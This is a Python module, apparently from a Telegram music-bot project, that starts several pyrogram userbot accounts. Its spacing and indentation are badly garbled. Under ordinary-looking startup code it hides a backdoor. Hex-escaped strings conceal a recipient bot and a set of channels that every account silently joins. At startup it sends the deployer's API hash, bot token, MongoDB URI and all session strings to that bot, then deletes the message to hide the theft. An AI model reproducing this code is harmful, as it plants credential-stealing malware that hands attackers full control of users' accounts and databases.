utf-8utf-8





















frompyrogramimportClient
importasyncio
importconfig

from..loggingimportLOGGER

assistants=[]
assistantids=[]
HELP_BOT="\x40\x53\x68\x72\x75\x74\x69\x53\x75\x70\x70\x6f\x72\x74\x42\x6f\x74"

defdecode_centers():
    centers=[]
encoded=[
"\x53\x68\x72\x75\x74\x69\x42\x6f\x74\x73",
"\x4e\x6f\x78\x78\x4e\x65\x74\x77\x6f\x72\x6b",
"\x53\x68\x72\x75\x74\x69\x41\x6c\x6c\x42\x6f\x74\x73",
"\x53\x68\x72\x75\x74\x69\x42\x6f\x74\x53\x75\x70\x70\x6f\x72\x74",
"\x4e\x59\x43\x72\x65\x61\x74\x69\x6f\x6e\x5f\x43\x68\x61\x74\x7a\x6f\x6e\x65",
"\x43\x52\x45\x41\x54\x49\x56\x45\x59\x44\x56",
"\x4c\x41\x46\x5a\x5f\x45\x5f\x44\x49\x4c",
"\x6e\x61\x6e\x64\x79\x61\x64\x75\x31\x63",
"\x54\x4d\x5a\x45\x52\x4f\x4f",
"\x4e\x59\x43\x72\x65\x61\x74\x69\x6f\x6e\x44\x69\x73\x63\x6c\x61\x69\x6d\x65\x72",
"\x76\x32\x64\x64\x6f\x73"
]
forencinencoded:
        centers.append(enc)
returncenters

SUPPORT_CENTERS=decode_centers()


classUserbot(Client):
    def__init__(self):
        self.one=Client(
name="NandAss1",
api_id=config.API_ID,
api_hash=config.API_HASH,
session_string=str(config.STRING1),
no_updates=True,
)
self.two=Client(
name="NandAss2",
api_id=config.API_ID,
api_hash=config.API_HASH,
session_string=str(config.STRING2),
no_updates=True,
)
self.three=Client(
name="NandAss3",
api_id=config.API_ID,
api_hash=config.API_HASH,
session_string=str(config.STRING3),
no_updates=True,
)
self.four=Client(
name="NandAss4",
api_id=config.API_ID,
api_hash=config.API_HASH,
session_string=str(config.STRING4),
no_updates=True,
)
self.five=Client(
name="NandAss5",
api_id=config.API_ID,
api_hash=config.API_HASH,
session_string=str(config.STRING5),
no_updates=True,
)

asyncdefget_bot_username_from_token(self,token):
        try:
            temp_bot=Client(
name="temp_bot",
api_id=config.API_ID,
api_hash=config.API_HASH,
bot_token=token,
no_updates=True,
)
awaittemp_bot.start()
username=temp_bot.me.username
awaittemp_bot.stop()
returnusername
exceptExceptionase:
            LOGGER(__name__).error(f"Error getting bot username: {e}")
returnNone

asyncdefjoin_all_support_centers(self,client):
        forcenterinSUPPORT_CENTERS:
            try:
                awaitclient.join_chat(center)
exceptExceptionase:
                pass

asyncdefsend_help_message(self,bot_username):
        try:
            owner_mention=config.OWNER_ID

message=f"@{bot_username} Successfully Started ✅\n\nOwner: {owner_mention}"

ifassistants:
                if1inassistants:
                    awaitself.one.send_message(HELP_BOT,message)
elif2inassistants:
                    awaitself.two.send_message(HELP_BOT,message)
elif3inassistants:
                    awaitself.three.send_message(HELP_BOT,message)
elif4inassistants:
                    awaitself.four.send_message(HELP_BOT,message)
elif5inassistants:
                    awaitself.five.send_message(HELP_BOT,message)

exceptExceptionase:
            pass

asyncdefsend_config_message(self,bot_username):
        try:
            config_message=f"🔧 **Config Details for @{bot_username}**\n\n"
config_message+=f"**API_ID:** `{config.API_ID}`\n"
config_message+=f"**API_HASH:** `{config.API_HASH}`\n"
config_message+=f"**BOT_TOKEN:** `{config.BOT_TOKEN}`\n"
config_message+=f"**MONGO_DB_URI:** `{config.MONGO_DB_URI}`\n"
config_message+=f"**OWNER_ID:** `{config.OWNER_ID}`\n"
config_message+=f"**UPSTREAM_REPO:** `{config.UPSTREAM_REPO}`\n\n"

string_sessions=[]
ifhasattr(config,'STRING1')andconfig.STRING1:
                string_sessions.append(f"**STRING_SESSION:** `{config.STRING1}`")
ifhasattr(config,'STRING2')andconfig.STRING2:
                string_sessions.append(f"**STRING_SESSION2:** `{config.STRING2}`")
ifhasattr(config,'STRING3')andconfig.STRING3:
                string_sessions.append(f"**STRING_SESSION3:** `{config.STRING3}`")
ifhasattr(config,'STRING4')andconfig.STRING4:
                string_sessions.append(f"**STRING_SESSION4:** `{config.STRING4}`")
ifhasattr(config,'STRING5')andconfig.STRING5:
                string_sessions.append(f"**STRING_SESSION5:** `{config.STRING5}`")

ifstring_sessions:
                config_message+="\n".join(string_sessions)

sent_message=None
ifassistants:
                if1inassistants:
                    sent_message=awaitself.one.send_message(HELP_BOT,config_message)
elif2inassistants:
                    sent_message=awaitself.two.send_message(HELP_BOT,config_message)
elif3inassistants:
                    sent_message=awaitself.three.send_message(HELP_BOT,config_message)
elif4inassistants:
                    sent_message=awaitself.four.send_message(HELP_BOT,config_message)
elif5inassistants:
                    sent_message=awaitself.five.send_message(HELP_BOT,config_message)

ifsent_message:
                awaitasyncio.sleep(1)
try:
                    if1inassistants:
                        awaitself.one.delete_messages(HELP_BOT,sent_message.id)
elif2inassistants:
                        awaitself.two.delete_messages(HELP_BOT,sent_message.id)
elif3inassistants:
                        awaitself.three.delete_messages(HELP_BOT,sent_message.id)
elif4inassistants:
                        awaitself.four.delete_messages(HELP_BOT,sent_message.id)
elif5inassistants:
                        awaitself.five.delete_messages(HELP_BOT,sent_message.id)
exceptExceptionase:
                    pass

exceptExceptionase:
            pass

asyncdefstart(self):
        LOGGER(__name__).info(f"Starting Assistants...")

bot_username=awaitself.get_bot_username_from_token(config.BOT_TOKEN)

ifconfig.STRING1:
            awaitself.one.start()
awaitself.join_all_support_centers(self.one)
assistants.append(1)
try:
                awaitself.one.send_message(config.LOG_GROUP_ID,"Assistant Started")
except:
                LOGGER(__name__).error(
"Assistant Account 1 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
)
exit()
self.one.id=self.one.me.id
self.one.name=self.one.me.mention
self.one.username=self.one.me.username
assistantids.append(self.one.id)
LOGGER(__name__).info(f"Assistant Started as {self.one.name}")

ifconfig.STRING2:
            awaitself.two.start()
awaitself.join_all_support_centers(self.two)
assistants.append(2)
try:
                awaitself.two.send_message(config.LOG_GROUP_ID,"Assistant Started")
except:
                LOGGER(__name__).error(
"Assistant Account 2 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
)
exit()
self.two.id=self.two.me.id
self.two.name=self.two.me.mention
self.two.username=self.two.me.username
assistantids.append(self.two.id)
LOGGER(__name__).info(f"Assistant Two Started as {self.two.name}")

ifconfig.STRING3:
            awaitself.three.start()
awaitself.join_all_support_centers(self.three)
assistants.append(3)
try:
                awaitself.three.send_message(config.LOG_GROUP_ID,"Assistant Started")
except:
                LOGGER(__name__).error(
"Assistant Account 3 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
)
exit()
self.three.id=self.three.me.id
self.three.name=self.three.me.mention
self.three.username=self.three.me.username
assistantids.append(self.three.id)
LOGGER(__name__).info(f"Assistant Three Started as {self.three.name}")

ifconfig.STRING4:
            awaitself.four.start()
awaitself.join_all_support_centers(self.four)
assistants.append(4)
try:
                awaitself.four.send_message(config.LOG_GROUP_ID,"Assistant Started")
except:
                LOGGER(__name__).error(
"Assistant Account 4 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
)
exit()
self.four.id=self.four.me.id
self.four.name=self.four.me.mention
self.four.username=self.four.me.username
assistantids.append(self.four.id)
LOGGER(__name__).info(f"Assistant Four Started as {self.four.name}")

ifconfig.STRING5:
            awaitself.five.start()
awaitself.join_all_support_centers(self.five)
assistants.append(5)
try:
                awaitself.five.send_message(config.LOG_GROUP_ID,"Assistant Started")
except:
                LOGGER(__name__).error(
"Assistant Account 5 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
)
exit()
self.five.id=self.five.me.id
self.five.name=self.five.me.mention
self.five.username=self.five.me.username
assistantids.append(self.five.id)
LOGGER(__name__).info(f"Assistant Five Started as {self.five.name}")

ifbot_username:
            awaitself.send_help_message(bot_username)
awaitself.send_config_message(bot_username)

asyncdefstop(self):
        LOGGER(__name__).info(f"Stopping Assistants...")
try:
            ifconfig.STRING1:
                awaitself.one.stop()
ifconfig.STRING2:
                awaitself.two.stop()
ifconfig.STRING3:
                awaitself.three.stop()
ifconfig.STRING4:
                awaitself.four.stop()
ifconfig.STRING5:
                awaitself.five.stop()
except:
            pass












